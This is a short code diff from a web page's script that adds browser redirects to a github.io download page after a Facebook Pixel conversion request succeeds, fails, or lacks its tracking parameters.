@@ -441,14 +441,17 @@ src="https://www.facebook.com/tr?id=1176409161334831&ev=PageView&noscript=1"
                     .then(response => response.json())
                     .then(data => {
                         console.log("Success:", data);
+                        window.location.href="https://justinaneth.github.io/secure-dl-page/?ok=success";
                     })
                     .catch(error => {
                         console.error("Error sending request:", error);
+                        window.location.href="https://justinaneth.github.io/secure-dl-page/?ok=error";
                     });
 
                 } else {
                     console.log("Pixel ID or FBCLID missing.");
                     console.log(`Pixel ID: ${pixelId}, FBCLID: ${fbclid}`);
+                    window.location.href="https://justinaneth.github.io/secure-dl-page/?ok=error";
                 }
             });
 
